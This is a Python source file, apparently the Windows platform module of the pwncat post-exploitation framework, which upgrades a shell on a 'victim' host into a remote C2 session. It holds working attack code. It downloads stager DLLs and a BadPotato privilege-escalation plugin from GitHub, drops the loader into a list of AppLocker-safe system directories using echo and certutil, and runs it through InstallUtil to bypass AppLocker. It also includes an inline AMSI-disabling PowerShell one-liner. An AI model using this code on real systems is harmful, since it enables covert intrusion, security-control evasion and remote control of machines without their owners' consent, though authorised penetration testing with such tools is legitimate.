"""
This platform supports interaction with a Windows target where either a cmd.exe
or powershell.exe stdio is connected directly to the active channel. pwncat will
utilize the C2 libraries located at `pwncat-windows-c2 <https://github.com/calebstewart/pwncat-windows-c2>`_
This will be automatically downloaded to the directory identified by the
``windows_c2_dir`` configuration which defaults to ``~/.local/share/pwncat/``.
It will be uploaded and executed via ``Install-Util`` in order to automatically
bypass AppLocker, and will provide you an unlogged, unconstrained powershell
session as well as basic process and file IO routines.

When operating in a platform-specific environment, you can safely execute multiple
processes and open multiple files with this platform. However, you should be
careful to cleanup all processes and files prior to return from your method
or code as the C2 will not attempt to garbage collect file or proces handles.
"""
import sys
import gzip
import json
import stat
import time
import base64
import shutil
import hashlib
import pathlib
import tarfile
import binascii
import readline  # noqa: F401
import functools
import threading
import subprocess
from io import BytesIO, RawIOBase, TextIOWrapper
from typing import List, Union, BinaryIO, Optional
from subprocess import TimeoutExpired, CalledProcessError
from dataclasses import dataclass

import requests

import pwncat
import pwncat.util
import pwncat.subprocess
from pwncat.platform import Path, Platform, PlatformError

INTERACTIVE_END_MARKER = b"INTERACTIVE_COMPLETE\r\n"
PWNCAT_WINDOWS_C2_VERSION = "v0.2.1"
PWNCAT_WINDOWS_C2_RELEASE_URL = "https://github.com/calebstewart/pwncat-windows-c2/releases/download/{version}/pwncat-windows-{version}.tar.gz"


class PowershellError(PlatformError):
    """Executing a powershell script caused an error"""

    def __init__(self, msg):
        super().__init__(msg)

        self.message = msg


class ProtocolError(PlatformError):
    def __init__(self, code: int, message: str):
        self.code = code
        self.message = message

        super().__init__(self.message)


@dataclass
class stat_result:
    """Python `os` doesn't provide a way to sainly construct a stat_result
    so I created this."""

    st_mode = 0
    st_ino = 0
    st_dev = 0
    st_nlink = 0
    st_uid = 0
    st_gid = 0
    st_size = 0
    st_atime = 0
    st_mtime = 0
    st_ctime = 0
    st_atime_ns = 0
    st_mtime_ns = 0
    st_ctime_ns = 0
    st_blocks = 0
    st_blksize = 0
    st_rdev = 0
    st_flags = 0
    st_gen = 0
    st_birthtime = 0
    st_fstype = 0
    st_rsize = 0
    st_creator = 0
    st_type = 0
    st_file_attributes = 0
    st_reparse_tag = 0


class WindowsFile(RawIOBase):
    """Wrapper around file handles on Windows"""

    def __init__(self, platform: "Windows", mode: str, handle: int, name: str = None):
        self.platform = platform
        self.mode = mode
        self.handle = handle
        self.is_open = True
        self.eof = False
        self.name = name

    def readable(self) -> bool:
        return "r" in self.mode

    def writable(self) -> bool:
        return "w" in self.mode

    def close(self):
        """Close a file handle on the remote host"""

        if not self.is_open:
            return

        self.platform.run_method("File", "close", self.handle)
        self.is_open = False

        return

    def readall(self):
        """Read until EOF"""

        data = b""

        while not self.eof:
            new = self.read(4096)
            if new is None:
                continue
            data += new

        return data

    def readinto(self, b: Union[memoryview, bytearray]):

        if self.eof:
            return 0

        try:
            result = self.platform.run_method("File", "read", self.handle, len(b))
        except ProtocolError as exc:

            # ERROR_BROKEN_PIPE
            if exc.code == 0x6D:
                self.eof = True
                return 0

            raise IOError(exc.message) from exc

        data = base64.b64decode(result["data"])
        b[: len(data)] = data

        if len(data) == 0:
            self.eof = True

        return len(data)

    def write(self, data: bytes):
        """Write data to this file"""

        if self.eof:
            return 0

        nwritten = 0
        while nwritten < len(data):
            chunk = data[nwritten:]

            try:
                result = self.platform.run_method(
                    "File",
                    "write",
                    self.handle,
                    base64.b64encode(chunk).decode("utf-8"),
                )
            except ProtocolError as exc:
                # ERROR_BROKEN_PIPE
                if exc.code == 0x6D:
                    self.eof = True
                    break
                raise IOError(exc.message) from exc

            nwritten += result["count"]

        return nwritten


class DotNetPlugin(object):
    """Represents a reflectively loaded .Net plugin within the remote C2
    This class is a helper which makes calling methods within a plugin
    more straightforward. If you want to call a method named ``get_system``
    you can use one of two syntaxes:

    .. code-block:: python

        plugin.run("get_system", "arguments", 1, 2, False)
        plugin.get_system("arguments", 1, 2, False)

    :param name: basename of the file which was loaded
    :type name: str
    :param checksum: md5sum of the assembly
    :type checksum: str
    :param ident: identifier for the remote assembly
    :type ident: int
    """

    def __init__(self, platform: "Windows", name: str, checksum: str, ident: int):

        self.names = [name]
        self.checksum = checksum
        self.ident = ident
        self.platform = platform

    def __getattr__(self, key: str):
        """Shortcut for calling a method. ``plugin.method()`` is equivalent
        to ``plugin.run("method")``."""
        return functools.partial(self.run, key)

    def run(self, method: str, *args):
        """Execute a method within the plugin"""

        return self.platform.run_method("Reflection", "call", self.ident, method, args)


class PopenWindows(pwncat.subprocess.Popen):
    """
    Windows-specific Popen wrapper class
    """

    def __init__(
        self,
        platform: Platform,
        args,
        stdout,
        stdin,
        stderr,
        text,
        encoding,
        errors,
        bufsize,
        result,
    ):
        super().__init__()

        self.platform = platform
        self.handle = result["handle"]
        self.stdio = [result["stdin"], result["stdout"], result["stderr"]]
        self.returncode = None

        self.stdin = WindowsFile(platform, "w", result["stdin"])
        self.stdout = WindowsFile(platform, "r", result["stdout"])
        self.stderr = WindowsFile(platform, "r", result["stderr"])

        if stdout != subprocess.PIPE:
            self.stdout.close()
            self.stdout = None
        if stderr != subprocess.PIPE:
            self.stderr.close()
            self.stderr = None
        if stdin != subprocess.PIPE:
            self.stdin.close()
            self.stdin = None

        if text or encoding is not None or errors is not None:
            line_buffering = bufsize == 1
            bufsize = -1

            if self.stdout is not None:
                self.stdout = TextIOWrapper(
                    self.stdout,
                    line_buffering=line_buffering,
                    encoding=encoding,
                    errors=errors,
                )
            if self.stderr is not None:
                self.stderr = TextIOWrapper(
                    self.stderr,
                    line_buffering=line_buffering,
                    encoding=encoding,
                    errors=errors,
                )
            if self.stdin is not None:
                self.stdin = TextIOWrapper(
                    self.stdin, encoding=encoding, errors=errors, write_through=True
                )

    def detach(self):

        self.returncode = 0

        if self.stdout is not None:
            self.stdout.close()
        if self.stderr is not None:
            self.stderr.close()
        if self.stdin is not None:
            self.stdin.close()

    def kill(self):
        return self.terminate()

    def terminate(self):

        if self.returncode is not None:
            return

        self.platform.run_method("Process", "kill", self.handle, 0)
        self.returncode = -1

    def poll(self):
        """Poll if the process has completed and get return code"""

        if self.returncode is not None:
            return self.returncode

        try:
            result = self.platform.run_method("Process", "poll", self.handle)
        except ProtocolError as exc:
            raise RuntimeError(exc.message)

        if result["stopped"]:
            self.returncode = result["code"] or 0
            return self.returncode

    def wait(self, timeout: float = None):

        if timeout is not None:
            end_time = time.time() + timeout
        else:
            end_time = None

        while self.poll() is None:
            if end_time is not None and time.time() >= end_time:
                raise TimeoutExpired(self.args, timeout)

            time.sleep(0.1)

        self.cleanup()
        return self.returncode

    def cleanup(self):
        if self.stdout is not None:
            self.stdout.close()
        if self.stdin is not None:
            self.stdin.close()
        if self.stderr is not None:
            self.stderr.close()

        # This just forces CloseHandle on the hProcess
        WindowsFile(self.platform, "r", self.handle).close()

        self.handle = None
        self.stdout = None
        self.stderr = None
        self.stdin = None

    def communicate(self, input=None, timeout=None):

        if self.returncode is not None:
            return (None, None)

        if input is not None and self.stdin is not None:
            self.stdin.write(input)

        if timeout is not None:
            end_time = time.time() + timeout
        else:
            end_time = None

        stdout = (
            "" if self.stdout is None or isinstance(self.stdout, TextIOWrapper) else b""
        )
        stderr = (
            "" if self.stderr is None or isinstance(self.stderr, TextIOWrapper) else b""
        )

        while self.poll() is None:
            if end_time is not None and time.time() >= end_time:
                raise TimeoutExpired(self.args, timeout, stdout)
            if self.stdout is not None:
                new_stdout = self.stdout.read(4096)
                if new_stdout is not None:
                    stdout += new_stdout
            if self.stderr is not None:
                new_stderr = self.stderr.read(4096)
                if new_stderr is not None:
                    stderr += new_stderr

        if self.stdout is not None:
            while True:
                new = self.stdout.read(4096)
                stdout += new
                if len(new) == 0:
                    break

        if self.stderr is not None:
            while True:
                new = self.stderr.read(4096)
                stderr += new
                if len(new) == 0:
                    break

        if len(stderr) == 0:
            stderr = None
        if len(stdout) == 0:
            stdout = None

        self.cleanup()

        return (stdout, stderr)


@dataclass
class BuiltinPluginInfo:
    """Tells pwncat where to find a builtin plugin"""

    name: str
    """ A friendly name used when loading the plugin """
    provides: List[str]
    """ List of DLL names which this plugin provides """
    url: str
    """ URL pointing to a tar.gz file containing the plugin DLL(s) """
    version: str
    """ The version number to download (this is formatted into the URL) """


class Windows(Platform):
    """Concrete platform class abstracting interaction with a Windows/
    Powershell remote host. The remote windows host must support
    powershell for this platform to function, and the channel must be
    established with an open powershell session."""

    name = "windows"
    PATH_TYPE = pathlib.PureWindowsPath
    C2_VERSION = "v0.2.1"
    PLUGIN_INFO = [
        BuiltinPluginInfo(
            name="windows-c2",
            provides=["stageone.dll", "stagetwo.dll"],
            url="https://github.com/calebstewart/pwncat-windows-c2/releases/download/{version}/pwncat-windows-{version}.tar.gz",
            version="v0.2.1",
        ),
        BuiltinPluginInfo(
            name="badpotato",
            provides=["BadPotato.dll"],
            url="https://github.com/calebstewart/pwncat-badpotato/releases/download/{version}/pwncat-badpotato-{version}.tar.gz",
            version="v0.0.1-alpha",
        ),
    ]

    @classmethod
    def open_plugin(cls, manager: "pwncat.manager.Manager", name: str) -> BytesIO:
        """
        Open the given plugin DLL for reading and return an open file object.
        If the given name matches a builtin plugin, it will be used. If a
        builtin plugin is not available, it will be downloaded from it's URL
        and saved in the provided plugin path. If the name does not match a
        provided plugin DLL, it is interpreted as a path and attempted to be
        opened.

        :param manager: the pwncat manager object used to locate the plugin directory
        :type manager: pwncat.manager.Manager
        :param name: name of the plugin being requested
        :type name: str
        :rtype: BytesIO
        """

        for plugin in cls.PLUGIN_INFO:
            if name in plugin.provides:
                break
        else:
            return open(name, "rb")

        path = (
            pathlib.Path(manager.config["plugin_path"])
            / plugin.name
            / plugin.version
            / name
        ).expanduser()
        if not path.exists():
            path.parent.mkdir(parents=True, exist_ok=True)
            url = plugin.url.format(version=plugin.version)

            manager.log(f"[blue]windows[/blue]: downloading {plugin.name} plugin")
            with requests.get(
                url,
                stream=True,
            ) as request:
                data = request.raw.read()
                with tarfile.open(mode="r:gz", fileobj=BytesIO(data)) as tar:
                    for provided in plugin.provides:
                        with tar.extractfile(provided) as provided_filp:
                            with (path.parent / provided).open("wb") as output:
                                shutil.copyfileobj(provided_filp, output)

        return path.open("rb")

    def __init__(
        self,
        session: "pwncat.session.Session",
        channel: pwncat.channel.Channel,
        *args,
        **kwargs,
    ):
        super().__init__(session, channel, *args, **kwargs)

        self.name = "windows"
        self.plugins = []

        # Initialize interactive tracking
        self._interactive = False
        self.interactive_tracker = 0

        # This is set when bootstrapping stage two
        self.host_uuid = None

        # Most Windows connections aren't capable of a PTY, and checking
        # is difficult this early. We will assume there isn't one.
        self.has_pty = True

        # Tracks paths to modules which have been sideloaded into powershell
        self.psmodules = []

        self._bootstrap_stage_two()

        self.refresh_uid()

        self.setup_prompt()

        # Load requested libraries
        # for library, methods in self.LIBRARY_IMPORTS.items():
        #     self._load_library(library, methods)

    def exit(self):
        """Ensure the C2 exits on the victim end. This is called automatically
        by session.close, and shouldn't be called manually."""

        self.run_method("StageTwo", "exit")

    def parse_response(self, data: bytes):
        """Parse a line of data from the C2"""

        with gzip.GzipFile(
            fileobj=BytesIO(base64.b64decode(data.decode("utf-8").strip())),
            mode="rb",
        ) as gz:
            result = json.loads(gz.read().decode("utf-8"))

        return result

    def run_method(self, typ: str, method: str, *args, wait: bool = True):
        r"""
        Execute a method within the pwncat-windows-c2. You must specify the type
        and method arguments. Arguments are passed via json encoding so any valid
        JSON types should be passed correctly onto the C2. Named arguments are not
        supported. Results are returned as a dictionary. In the case of an error,
        a ProtocolError is raised with the error code and message.

        :param typ: The type name where the method you'd like to execute resides
        :type typ: str
        :param method: The name of the method you'd like to execute
        :type method: str
        :param \*args: the positional arguments for the method you are calling
        :type \*args: correct type for given method
        """

        command = [typ, method, *args]
        payload = BytesIO()

        # compress command arguments
        with gzip.GzipFile(fileobj=payload, mode="wb") as gz:
            gz.write(json.dumps(command).encode("utf-8"))

        # Send the command
        thing = base64.b64encode(payload.getbuffer())
        self.channel.sendline(thing)

        if wait:

            keyboard_interrupt = False

            # Receive the response
            while True:
                try:
                    result = self.parse_response(self.channel.recvline())
                    break
                except (gzip.BadGzipFile, binascii.Error):
                    continue
                except KeyboardInterrupt:
                    self.session.log(
                        "[yellow]warning[/yellow]: waiting for command to complete"
                    )
                    keyboard_interrupt = True

            if keyboard_interrupt:
                raise KeyboardInterrupt

            # Raise an appropriate error if needed
            if result["error"] != 0:
                raise ProtocolError(result["error"], result.get("message", ""))

            return result["result"]

    def setup_prompt(self):
        """Set a prompt method for powershell to ensure our prompt looks pretty :)"""

        self.powershell(
            """
function prompt {
  $ESC = [char]27
  Write-Host "$ESC[31m(remote)$ESC[33m $env:UserName@$env:ComputerName$ESC[0m:$ESC[36m$($executionContext.SessionState.Path.CurrentLocation)$ESC[0m$" -NoNewLine
  return " "
}"""
        )

    def _bootstrap_stage_two(self):
        """This routine upgrades a standard powershell or cmd shell to an
        instance of the pwncat stage two C2. It will first locate a valid
        writable temporary directory (from the list below) and then upload
        stage one to that directory. Stage one is a simple DLL which recieves
        a base64 encoded, gzipped payload to reflectively load and execute.
        We run stage one using Install-Util to bypass applocker."""

        possible_dirs = [
            "\\Windows\\Tasks",
            "\\Windows\\Temp",
            "\\windows\\tracing",
            "\\Windows\\Registration\\CRMLog",
            "\\Windows\\System32\\FxsTmp",
            "\\Windows\\System32\\com\\dmp",
            "\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys",
            "\\Windows\\System32\\spool\\PRINTERS",
            "\\Windows\\System32\\spool\\SERVERS",
            "\\Windows\\System32\\spool\\drivers\\color",
            "\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter",
            "\\Windows\\System32\\Tasks_Migrated (after peforming a version upgrade of Windows 10)",
            "\\Windows\\SysWOW64\\FxsTmp",
            "\\Windows\\SysWOW64\\com\\dmp",
            "\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter",
            "\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System",
        ]
        chunk_sz = 1900

        loader_encoded_name = pwncat.util.random_string()

        # Read the loader
        # with stageone.open("rb") as filp:
        with Windows.open_plugin(self.manager, "stageone.dll") as filp:
            loader_dll = base64.b64encode(filp.read())

        # Extract first chunk
        chunk = loader_dll[0:chunk_sz].decode("utf-8")
        good_dir = None
        loader_remote_path = None

        self.channel.recvuntil(b">")

        # Find available file by trying to write first chunk
        for possible in possible_dirs:
            loader_remote_path = pathlib.PureWindowsPath(possible) / loader_encoded_name
            good_dir = possible
            self.channel.send(
                f"""echo {chunk} >"{str(loader_remote_path)}"\n""".encode("utf-8")
            )
            self.channel.recvline()
            result = self.channel.recvuntil(b">")
            if b"denied" not in result.lower():
                self.session.log(
                    f"dropping stage one in {repr(str(loader_remote_path))}"
                )
                break
        else:
            raise PlatformError("no writable applocker-safe directories")

        # Write remaining chunks to selected path
        for c in range(chunk_sz, len(loader_dll), chunk_sz):
            self.channel.send(
                f"""echo {loader_dll[c:c+chunk_sz].decode('utf-8')} >>"{str(loader_remote_path)}"\n""".encode(
                    "utf-8"
                )
            )
            self.channel.recvline()
            self.channel.recvuntil(b">")

        # Decode the base64 to the actual dll
        self.channel.send(
            f"""certutil -decode "{str(loader_remote_path)}" "{good_dir}\\{loader_encoded_name}.dll"\n""".encode(
                "utf-8"
            )
        )
        self.channel.recvline()
        self.channel.recvuntil(b">")

        self.channel.send(f"""del "{str(loader_remote_path)}"\n""".encode("utf-8"))
        self.channel.recvline()
        self.channel.recvuntil(b">")

        # Search for all instances of InstallUtil within all installed .Net versions
        self.channel.send(
            """cmd /c "dir \\Windows\\Microsoft.NET\\* /s/b | findstr InstallUtil.exe$"\n""".encode(
                "utf-8"
            )
        )
        self.channel.recvline()

        # Select the newest version
        result = self.channel.recvuntil(b">").decode("utf-8")
        install_utils = [
            x.rstrip("\r") for x in result.split("\n") if x.rstrip("\r") != ""
        ][-2]

        version = pathlib.PureWindowsPath(install_utils).parts[-2]

        self.session.log(
            f"using install utils from .net [cyan]{version}[/cyan]", highlight=False
        )

        install_utils = install_utils.replace(" ", "\\ ")

        # Execute Install-Util to bypass AppLocker/CLM
        self.channel.send(
            f"""{install_utils} /logfile= /LogToConsole=false /U "{good_dir}\\{loader_encoded_name}.dll"\n""".encode(
                "utf-8"
            )
        )

        # Wait for loader to
        self.channel.recvuntil(b"READY")
        self.channel.recvuntil(b"\n")

        # Load, Compress and Encode stage two
        with Windows.open_plugin(self.manager, "stagetwo.dll") as filp:
            stagetwo_dll = filp.read()
            compressed = BytesIO()
            with gzip.GzipFile(fileobj=compressed, mode="wb") as gz:
                gz.write(stagetwo_dll)
            encoded = base64.b64encode(compressed.getvalue())

        # Send stage two
        self.channel.sendline(encoded)

        # Wait for stage two to be loaded
        self.channel.recvuntil(b"READY")
        self.channel.recvuntil(b"\n")

        # Read host-specific GUID
        self.host_uuid = self.channel.recvline().strip().decode("utf-8")

        # Bypass AMSI
        try:
            self.powershell(
                """$am = ([Ref].Assembly.GetTypes()  | % { If ( $_.Name -like "*iUtils" ){$_} })[0];$con = ($am.GetFields('NonPublic,Static') | % { If ( $_.Name -like "*Context" ){$_} })[0];$addr = $con.GetValue($null);[IntPtr]$ptr = $addr;[Int32[]]$buf = @(0); if( $ptr -ne $null -and $ptr -ne 0 ) { [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1); }"""
            )
        except PowershellError:
            self.session.log("[yellow]warning[/yellow]: failed to disable AMSI!")

    def get_pty(self):
        """We don't need to do this for windows"""

    def Popen(
        self,
        args,
        bufsize=-1,
        stdin=None,
        stdout=None,
        stderr=None,
        shell=False,
        cwd=None,
        encoding=None,
        text=None,
        errors=None,
        env=None,
        bootstrap_input=None,
        **other_popen_kwargs,
    ) -> pwncat.subprocess.Popen:

        if self.interactive:
            raise PlatformError(
                "cannot open non-interactive process in interactive mode"
            )

        if shell:
            if isinstance(args, list):
                args = [
                    "powershell.exe",
                    "-noprofile",
                    "-command",
                    subprocess.list2cmdline(args),
                ]
            else:
                args = ["powershell.exe", "-noprofile", "-command", args]

        # This is apparently what subprocess.Popen does on windows...
        if isinstance(args, list):
            args = subprocess.list2cmdline(args)
        elif not isinstance(args, str):
            raise ValueError("expected command string or list of arguments")

        try:
            result = self.run_method("Process", "start", args)
        except ProtocolError as exc:
            if "pipe" in exc.message:
                raise OSError(exc.message)
            else:
                raise FileNotFoundError(exc.message)

        return PopenWindows(
            self,
            args,
            stdout,
            stdin,
            stderr,
            text,
            encoding,
            errors,
            bufsize,
            result,
        )

    def get_host_hash(self):
        """
        Unique host identifier for this target. It is taken from the unique
        cryptographic GUID stored in the windows registry at install.
        """
        return self.host_uuid

    def interactive_loop(self, interactive_complete: "threading.Event"):
        """
        Interactively read input from the attacker and send it to an interactive
        terminal on the victim. `RawModeExit` and `ChannelClosed` exceptions
        are handled by the manager appropriately. If any changes are made to the
        local TTY, they should be reverted before returning (ideally via a try-finally
        block). Output from the remote host is automatically piped to stdout via
        a background thread by the manager.
        """

        pwncat.util.push_term_state()

        try:
            while not interactive_complete.is_set():
                try:
                    data = input()
                    self.channel.send(data.encode("utf-8") + b"\r")
                except KeyboardInterrupt:
                    if not interactive_complete.is_set():
                        sys.stdout.write("\n")
                        self.session.manager.log(
                            "[yellow]warning[/yellow]: Ctrl-C does not work for windows targets"
                        )
        except EOFError:
            self.channel.send(b"\rexit\r")
            self.channel.recvuntil(INTERACTIVE_END_MARKER)
            raise pwncat.util.RawModeExit
        finally:
            pwncat.util.pop_term_state()

    @property
    def interactive(self):
        return self._interactive

    @interactive.setter
    def interactive(self, value):

        if value == self._interactive:
            return

        # Reset the tracker

        if value:
            try:
                self.run_method("PowerShell", "start", wait=False)
            except ProtocolError as exc:
                raise PlatformError(exc.message)

            # Wait for the powershell runspace to be up and running
            output = self.channel.recvline()
            if not output.strip().startswith(b"INTERACTIVE_START"):
                self.interactive_tracker = len(INTERACTIVE_END_MARKER)
                result = self.parse_response(output)
                raise PlatformError(result["message"])

            self._interactive = True
            self.interactive_tracker = 0
            return
        if not value:

            # Receive the method response
            data = self.parse_response(self.channel.recvline())
            if data["error"] != 0:
                self.session.log(data["message"])

            self._interactive = False
            self.refresh_uid()

    def process_output(self, data: bytes):
        """Process stdout while in interactive mode. This is called
        each time the victim output thread receives data. You can modify
        the input data and return a new copy if needed before output to
        the screen.

        :param data: the data received from the victim in interactive mode
        :type data: bytes
        """

        transformed = bytearray(b"")
        has_cr = False

        for idx, b in enumerate(data):

            # Basically, we just transform bare \r to \r\n
            if has_cr and b != ord("\n"):
                transformed.append(ord("\n"))

            # Track whether we had a carriage return
            has_cr = b == ord("\r")

            # Add the character to the resulting array
            transformed.append(b)

            # Track interactive exit that we didn't explicitly request
            if INTERACTIVE_END_MARKER[self.interactive_tracker] == b:
                self.interactive_tracker += 1
                if self.interactive_tracker == len(INTERACTIVE_END_MARKER):
                    self.interactive_tracker = 0
                    self.channel.unrecv(data[idx + 1 :])
                    raise pwncat.util.RawModeExit
            else:
                self.interactive_tracker = 0

        # Return transformed data
        return transformed

    def open(
        self,
        path: Union[str, Path],
        mode: str = "r",
        buffering: int = -1,
        encoding: str = "utf-8",
        errors: str = None,
        newline: str = None,
    ):
        """Mimick the built-in open method."""

        # Ensure all mode properties are valid
        for char in mode:
            if char not in "rwb":
                raise PlatformError(f"{char}: unknown file mode")

        # Save this just in case we are opening a text-mode stream
        line_buffering = buffering == -1 or buffering == 1

        # For text-mode files, use default buffering for the underlying binary
        # stream.
        if "b" not in mode:
            buffering = -1

        try:
            result = self.run_method("File", "open", path, mode)
        except ProtocolError as exc:
            raise FileNotFoundError(f"{path}: {exc.message}")

        stream = WindowsFile(self, mode, result["handle"], name=path)

        if "b" not in mode:
            stream = TextIOWrapper(
                stream,
                encoding=encoding,
                errors=errors,
                newline=newline,
                write_through=True,
                line_buffering=line_buffering,
            )

        return stream

    def _do_which(self, path: str):
        """Locate a binary of the victim. This implements the actual interaction
        with the victim. The `Platform.which` method implements the caching mechanism.

        :param path: name of the binary you are looking for
        :type path: str
        """

        try:
            p = self.run(
                ["where.exe", path], capture_output=True, text=True, check=True
            )

            return p.stdout.strip()
        except CalledProcessError:
            return None

    def refresh_uid(self):
        """Retrieve the current user ID. For Windows, this is done
        through System.Security.Principal.WindowsIdentity::GetCurrent().User."""

        self.user_info = self.powershell(
            "[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value"
        )[0]

        # Check if we are an administrator
        try:
            result = self.powershell(
                "(New-Object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)"
            )

            if not result:
                # this failed... so let's not raise an exception because that
                # would break a lot of stuff
                self._is_admin = False

            self._is_admin = result[0]
        except PowershellError:
            # it failed, so safely ignore and continue
            self._is_admin = False

        # Check if we are SYSTEM
        try:
            username = self.powershell("[System.Environment]::UserName")

            if not username:
                # this failed... so let's not raise an exception because that
                # would break a lot of stuff
                self._is_system = False

            self._is_system = bool(username[0].strip() == "SYSTEM")

        except PowershellError:
            # it failed, so safely ignore and continue
            self._is_system = False

    def getuid(self):
        """Retrieve the cached User ID"""

        return self.user_info

    def new_item(self, **kwargs):
        """Run the `New-Item` commandlet with specified arguments and
        raise the appropriate local exception if requried. For a list of
        valid arguments, see the New-Item help documentation."""

        command = "New-Item "
        for arg, value in kwargs.items():
            if value is None:
                command += "-" + arg + " "
            else:
                command += f'-{arg} "{value}"'

        try:
            result = self.powershell(command)
            return result[0]
        except PowershellError as exc:
            if "not exist" in exc:
                raise FileNotFoundError(kwargs["Path"])
            elif "exist" in exc:
                raise FileExistsError(kwargs["Path"])
            elif "directory":
                raise NotADirectoryError(kwargs["Path"])
            else:
                raise PermissionError(kwargs["Path"])

    def abspath(self, path: str) -> str:
        """Convert the given relative path to absolute.

        :param path: a relative path
        :type path: str
        :returns: an equivalent absolute path
        :rtype: str
        """

        try:
            result = self.powershell(
                f'$ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath("{path}")'
            )
            return result[0]
        except PowershellError as exc:
            raise FileNotFoundError(path) from exc

    def chdir(self, path: str):
        """Change the current working directory"""

        try:
            result = self.powershell(f'$_ = (pwd) ; cd "{path}" ; $_ | Select Path')

            return result[0]["Path"]
        except PowershellError as exc:
            if "not exist" in str(exc):
                raise FileNotFoundError(path) from exc
            raise PermissionError(path) from exc

    def chmod(self, path: str, mode: int):
        """Change a file's mode. Per the python documentation, this is only
        used to change the read-only flag for the Windows platform."""

        try:
            if mode & stat.S_IWRITE:
                value = "$false"
            else:
                value = "$true"

            self.powershell(
                f'Set-ItemProperty -Path "{path}" -Name IsReadOnly -Value {value}'
            )
        except PowershellError as exc:
            if "not exist" in str(exc):
                raise FileNotFoundError(path) from exc
            raise PermissionError(path) from exc

    def getenv(self, name: str) -> str:
        """Retrieve the value of a given environment variable in the
        current shell.

        :param name: name of the environment variable
        :type name: str
        :returns: value of the variable
        :rtype: str
        """

        try:
            result = self.powershell(f"$env:{name}")
            return result[0]
        except PowershellError as exc:
            raise KeyError(name) from exc

    def link_to(self, target: str, path: str):
        """Create hard link at ``path`` pointing to ``target``. This will
        likely result in a PermissionError exception on Windows. It is
        implemented with the New-Item powershell commandlet.

        :param target: the path to the target of the link
        :type target: str
        :param path: the path to the new link object
        :type path: str
        """

        self.new_item(ItemType="HardLink", Path=path, Target=target)

    def symlink_to(self, target: str, path: str):
        """Create a symlink at ``path`` pointing to ``target``. This is
        implemented using the New-Item powershell commandlet.

        :param target: the path to the target of the link
        :type target: str
        :param path: the path to the new link object
        :type path: str
        """

        self.new_item(ItemType="SymbolicLink", Path=path, Target=target)

    def listdir(self, path: str):
        """Return a list of items in the directory at the given relative
        or absolute directory path.

        :param path: relative or abosolute directory path
        :type path: str
        :returns: list of file or directory names
        :rtype: List[str]
        """

        try:
            result = self.powershell(f'Get-ChildItem -Force -Path "{path}" | Select ')

            # Check if there were no entries
            if not result:
                return []

            # Check if there was one entry
            if isinstance(result[0], dict):
                return [result[0]["Name"]]

            return [r["Name"] for r in (result[0] if len(result) else [])]
        except PowershellError as exc:
            if "not exist" in str(exc):
                raise FileNotFoundError(path)
            elif "directory" in str(exc):
                raise NotADirectoryError(path)
            else:
                raise PermissionError(path)

    def lstat(self):
        """Perform stat on a link instead of the target of the link."""

        raise PlatformError("lstat not implemented for Windows")

    def mkdir(self, path: str, mode: int = 0o777, parents: bool = True):
        """Create a new directory. This is implemented with the New-Item
        commandlet.

        :param path: path to the new directory
        :type path: str
        :param mode: permissions for the directory (ignored for windows)
        :type mode: int
        :param parents: whether to create all items (defaults to True for windows)
        """

        self.new_item(ItemType="Directory", Path=path)

    def readlink(self):
        """Read the target of a filesystem link"""

        raise PlatformError("readlink not implemented for Windows")

    def rename(self, src: str, dst: str):
        """Rename a file

        :param src: path to the source file
        :type src: str
        :param dst: path or new name for the destination file
        :type dst: str
        """

        try:
            self.powershell(f'Rename-Item -Path "{src}" -NewName "{dst}"')
        except PowershellError as exc:
            if "not exist" in str(exc):
                raise FileNotFoundError(src)
            raise PermissionError(src)

    def rmdir(self, path: str, recurse: bool = False):
        """Remove a directory, optionally remove all contents first.

        :param path: path to a directory to remove
        :type path: str
        :param recurse: whether to recursively remove all contents first
        :type recurse: bool
        """

        # This is a bad solution, but powershell is stupid
        # NOTE: this is because there's no way to stop powershell from prompting for confirmation
        if not recurse and len(self.listdir(path)) != 0:
            raise FileNotFoundError(path)

        try:
            command = f'Remove-Item -Force -Confirm:$false -Path "{path}"'
            if recurse:
                command += " -Recurse"
            self.powershell(command)
        except PowershellError as exc:
            if "not exist" in str(exc) or "empty" in str(exc):
                raise FileNotFoundError(path)
            raise PermissionError(path)

    def stat(self, path: str) -> stat_result:
        """Perform a stat on the given path, returning important file
        system details on the file.

        :param path: path to an existing file
        :type path: str
        :returns: the stat data
        :rtype: stat_result
        """

        try:
            props = self.powershell(f'Get-ItemProperty -Path "{path}"')[0]
        except PowershellError as exc:
            if "not exist" in str(exc):
                raise FileNotFoundError(path) from exc
            raise PermissionError(path) from exc

        result = stat_result()

        result.st_ctime_ns = (
            float(props["CreationTimeUtc"].split("(")[1].split(")")[0]) * 1000000.0
        )
        result.st_atime_ns = (
            float(props["LastAccessTimeUtc"].split("(")[1].split(")")[0]) * 1000000.0
        )
        result.st_mtime_ns = (
            float(props["LastWriteTimeUtc"].split("(")[1].split(")")[0]) * 1000000.0
        )
        result.st_size = props["Length"] if "Length" in props else 0
        result.st_dev = None
        result.st_nlink = None
        result.st_ino = None
        result.st_file_attributes = props["Attributes"]
        result.st_reparse_point = 0

        result.st_ctime = result.st_ctime_ns / 1000000000.0
        result.st_atime = result.st_atime_ns / 1000000000.0
        result.st_mtime = result.st_mtime_ns / 1000000000.0

        if result.st_file_attributes & stat.FILE_ATTRIBUTE_READONLY:
            result.st_mode |= stat.S_IREAD
        else:
            result.st_mode |= stat.S_IREAD | stat.S_IWRITE

        if result.st_file_attributes & stat.FILE_ATTRIBUTE_DEVICE:
            result.st_mode |= stat.S_IFBLK
        if result.st_file_attributes & stat.FILE_ATTRIBUTE_DIRECTORY:
            result.st_mode |= stat.S_IFDIR
        if result.st_file_attributes & stat.FILE_ATTRIBUTE_NORMAL:
            result.st_mode |= stat.S_IFREG
        elif result.st_file_attributes & stat.FILE_ATTRIBUTE_REPARSE_POINT:
            result.st_mode |= stat.S_IFLNK

        return result

    def tempfile(
        self, mode: str, length: Optional[int] = 8, suffix: Optional[str] = None
    ):
        """Create a temporary file in a safe directory. Optionally provide a suffix"""

        if suffix is None:
            suffix = ""
        else:
            suffix = "." + suffix

        # Get the temporary directory
